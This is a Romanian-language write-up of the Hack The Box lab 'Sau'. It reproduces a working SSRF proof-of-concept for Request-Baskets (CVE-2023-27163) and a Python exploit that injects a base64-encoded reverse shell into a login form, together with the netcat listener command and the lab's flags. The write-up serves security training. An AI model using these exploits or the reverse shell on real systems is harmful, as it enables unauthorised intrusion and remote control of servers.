1. Scanam mașina pentru a vedea porturile deschise.
```shell
sudo nmap -sSCV -T 4 10.10.11.224 -oN ~/Hackthebox/Labs/Sau/nmap.scan
```
![[Pasted image 20231107075853.png]]
Vedem următoarea informație sunt deschise 3 porturi [[ssh]] el e si pe portul 22 [[http request smuggling]] pe 80 si încă ceva pe 5555 la priva vedere este tot un [[http request smuggling]].
2. Accesam [[IP]] cu portul suspect:
![[Pasted image 20231107080107.png]]
3. Cel mai suspect este următoarea informație->
![[Pasted image 20231107131300.png]]
`request-baskets| Version 1.2.1`
Aceasta versiune este vulnerabila pentru tipul de atac [[SSRF]] Server-Side Request Forgery.
Daca facem un search pe google.com vom găsi vulnerabilitatea data.
```bash
#!/bin/bash  
  
echo -e "Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163\n";  
  
if [ "$#" -lt 2 ] || [ "$1" = "-h" ] || [ "$1" = "--help" ]; then  
   help="Usage: CVE-2023-27163.sh <URL> <TARGET>\n\n";  
   help+="This PoC will create a vulnerable basket on a Request-Baskets (<= 1.2.1) server,\n";  
   help+="which will act as a proxy to other services and servers.\n\n";  
   help+="Arguments:\n" \  
   help+=" URL            main path (/) of the server (eg. http://127.0.0.1:5000/)\n";  
   help+=" TARGET         r-baskets target server (eg. https://b5f5-138-204-24-206.ngrok-free.app/)\n\n";  
   help+="More info at https://github.com/entr0pie/CVE-2023-27163.";  
  
   echo -e "$help";  
   exit 1;  
fi  
  
URL=$1  
ATTACKER_SERVER=$2  
  
if [ "${URL: -1}" != "/" ]; then  
   URL="$URL/";  
fi;  
  
BASKET_NAME=$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c "6");  
  
API_URL="$URL""api/baskets/$BASKET_NAME";  
  
PAYLOAD="{\"forward_url\": \"$ATTACKER_SERVER\",\"proxy_response\": true,\"insecure_tls\": false,\"expand_path\": true,\"capacity\": 250}";  
  
echo "> Creating the \"$BASKET_NAME\" proxy basket...";  
  
if ! response=$(curl -s -X POST -H 'Content-Type: application/json' -d "$PAYLOAD" "$API_URL"); then  
   echo "> FATAL: Could not properly request $API_URL. Is the server online?";  
   exit 1;  
fi;  
  
BASKET_URL="$URL$BASKET_NAME";  
  
echo "> Basket created!";  
echo "> Accessing $BASKET_URL now makes the server request to $ATTACKER_SERVER.";  
  
if ! jq --help 1>/dev/null; then  
   echo "> Response body (Authorization): $response";  
else  
   echo "> Authorization: $(echo "$response" | jq -r ".token")";  
fi;  
  
exit 0;
```
Jos mai este si fișierul.
![[CVE-2023-27163.sh]]
4. După instrucții facem un start la script
```shell
./CVE-2023-27163.sh http://10.10.11.224:55555/ http://127.0.0.1:80/
```
![[Pasted image 20231107132245.png]]
In cazul nostru primul link este victima cu portul 55555 al 2 link este [[IP]] adresa pentru localhost.
Accesăm linkul pentru ca sa vedem ce este pe pagina care este pe portul 80.
![[Pasted image 20231107132422.png]]
5. Pe google cu un seach primim 
![[Pasted image 20231107134026.png]]
 Aici este exploitul. 
```python
 '''  
 ██████  ██▓███   ▒█████   ▒█████   ██ ▄█▀ ██▓▓█████  ██▀███     
▒██    ▒ ▓██░  ██▒▒██▒  ██▒▒██▒  ██▒ ██▄█▒ ▓██▒▓█   ▀ ▓██ ▒ ██▒  
░ ▓██▄   ▓██░ ██▓▒▒██░  ██▒▒██░  ██▒▓███▄░ ▒██▒▒███   ▓██ ░▄█ ▒  
 ▒   ██▒▒██▄█▓▒ ▒▒██   ██░▒██   ██░▓██ █▄ ░██░▒▓█  ▄ ▒██▀▀█▄     
▒██████▒▒▒██▒ ░  ░░ ████▓▒░░ ████▓▒░▒██▒ █▄░██░░▒████▒░██▓ ▒██▒  
▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░▓  ░░ ▒░ ░░ ▒▓ ░▒▓░  
░ ░▒  ░ ░░▒ ░       ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░ ▒ ░ ░ ░  ░  ░▒ ░ ▒░  
░  ░  ░  ░░       ░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░  ▒ ░   ░     ░░   ░    
     ░               ░ ░      ░ ░  ░  ░    ░     ░  ░   ░        
'''  
  
import sys;  
import os;  
import base64;  
  
def main():  
       listening_IP = None  
       listening_PORT = None  
       target_URL = None  
  
       if len(sys.argv) != 4:  
               print("Error. Needs listening IP, PORT and target URL.")  
               return(-1)  
  
       listening_IP = sys.argv[1]  
       listening_PORT = sys.argv[2]  
       target_URL = sys.argv[3] + "/login"  
       print("Running exploit on " + str(target_URL))  
       curl_cmd(listening_IP, listening_PORT, target_URL)  
  
def curl_cmd(my_ip, my_port, target_url):  
       payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.  
AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno  
(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''  
       encoded_payload = base64.b64encode(payload.encode()).decode()  # enco  
de the payload in Base64  
       command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_pa  
yload}\"+|+base64+-d+|+sh`'"  
       print("comm:",command)  
       os.system(command)  
  
if __name__ == "__main__":  
 main()
```
Fisierul complex
![[exploit.py]]
5. Rulam vulnerabilitatea ca sa primim revers shell-ul nostru:
```bash
python3 exploit.py 10.10.14.25 9001 http://10.10.  
11.224:55555/tgetkl
```
Acum aven nevoie sa ascultam traficul:
```bash
nc -lvnp 9001
```
![[Pasted image 20231107191913.png]]
![[Pasted image 20231107192048.png]]
Flag user: `c28c26065508f8300bfd03bdb7069ffb`
6. Rulam comanda:
```bash
sudo -l 
```
![[Pasted image 20231107192150.png]]
Avem si posibilitatea sa primim root:
![[Pasted image 20231107192249.png]]
Deci avem root:
![[Pasted image 20231107192537.png]]
![[Pasted image 20231107192548.png]]
![[Pasted image 20231107192611.png]]
Si flagul final `21586ecaa63bc52bda009a0627d9aeaa`
